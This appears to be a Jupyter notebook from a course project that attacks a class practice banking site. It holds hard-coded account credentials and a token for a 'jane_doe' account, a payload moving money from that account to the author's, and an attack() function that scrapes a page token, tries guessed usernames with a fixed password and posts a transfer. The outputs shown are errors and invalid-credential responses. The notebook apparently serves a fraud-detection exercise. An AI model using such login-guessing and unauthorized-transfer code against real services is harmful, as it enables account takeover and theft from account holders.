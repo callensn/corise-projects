{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3e3251b0",
   "metadata": {},
   "source": [
    "**Corise Project Week 1**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "1b8dac0e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import json\n",
    "from bs4 import BeautifulSoup\n",
    "from time import sleep\n",
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "3bda77b7",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "def get_login(token):\n",
    "    login_data = {\n",
    "        'username': '9872894541166576',\n",
    "        'password': '123456',\n",
    "        'token': token\n",
    "    }\n",
    "    return login_data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "bce4ea40",
   "metadata": {},
   "outputs": [],
   "source": [
    "headers = {\n",
    "    'Content-type': 'application/json'\n",
    "}\n",
    "dash_headers = {\n",
    "    'content-type': 'text/html; charset=utf-8'\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "65170a40",
   "metadata": {},
   "outputs": [],
   "source": [
    "url = 'https://class.disfraud.com'\n",
    "login_url = 'https://class.disfraud.com/login'\n",
    "dashboard_url = 'https://class.disfraud.com/dashboard'\n",
    "transfer_url = 'https://class.disfraud.com/transfer'\n",
    "\n",
    "# r = requests.post(login_url, json.dumps(login_data), headers=headers)\n",
    "# new_r = requests.get(url, headers=dash_headers)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b53cfb1",
   "metadata": {},
   "outputs": [],
   "source": [
    "9872958204794217"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "849ae67e",
   "metadata": {},
   "outputs": [],
   "source": [
    "jane_doe = {\n",
    "    'username': \"9872958204794217\",\n",
    "    'password': \"234567\",\n",
    "    'token': \"2795541.2215271661\"\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "id": "4cdf2f43",
   "metadata": {},
   "outputs": [],
   "source": [
    "def transfer(token):\n",
    "    transfer_payload = {\n",
    "        'amount': .25,\n",
    "        'source': \"9872958204794217\",\n",
    "        'target': \"9872894541166576\",\n",
    "        'token': token\n",
    "    }\n",
    "    return transfer_payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 286,
   "id": "4e1ac551",
   "metadata": {},
   "outputs": [],
   "source": [
    "transfer_funds = requests.post(transfer_url, json.dumps(transfer_payload), headers=headers)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 287,
   "id": "be9aeb0d",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<!doctype html>\\n<html lang=en>\\n<title>500 Internal Server Error</title>\\n<h1>Internal Server Error</h1>\\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\\n'"
      ]
     },
     "execution_count": 287,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "transfer_funds.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 306,
   "id": "6322612c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Unauthorized access.\n"
     ]
    }
   ],
   "source": [
    "with requests.Session() as session:\n",
    "    post = session.post(login_url, json.dumps(login_data), headers=headers)\n",
    "    r = session.get(dashboard_url)\n",
    "    transfer = session.post(transfer_url, json.dumps(transfer_payload), headers=headers)\n",
    "    print(transfer.text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "id": "60eed2b9",
   "metadata": {},
   "outputs": [],
   "source": [
    "def attack_login(stuff, token):\n",
    "    login_data = {\n",
    "        'username': '9871' + stuff,\n",
    "        'password': '000000',\n",
    "        'token': token\n",
    "    }\n",
    "    return login_data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "id": "a935d43e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def attack():\n",
    "    with requests.Session() as s:\n",
    "        r = s.get(url)\n",
    "        variables  = r.text.split(\"var \")[1:]  # get each var entry\n",
    "        for v in variables:\n",
    "            name = v.split(\"=\")[0].strip()\n",
    "            value = v.split(\"\\\"\")[1]\n",
    "        stuff = \"12345\"\n",
    "        login_data = attack_login(stuff, value)\n",
    "        sleep(1)\n",
    "        r = s.post(login_url, json=login_data)\n",
    "        print(r.text)\n",
    "        sleep(1)\n",
    "        transfer_payload = transfer(value)\n",
    "        transfer_funds = s.post(transfer_url, json=transfer_payload)\n",
    "        \n",
    "        return transfer_funds\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "e484fbd3",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{\"error_message\":\"Your credentials were invalid. Please try again.\",\"new_token\":\"2649090.4097973661\",\"success\":false}\n",
      "\n"
     ]
    }
   ],
   "source": [
    "new_r = attack()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
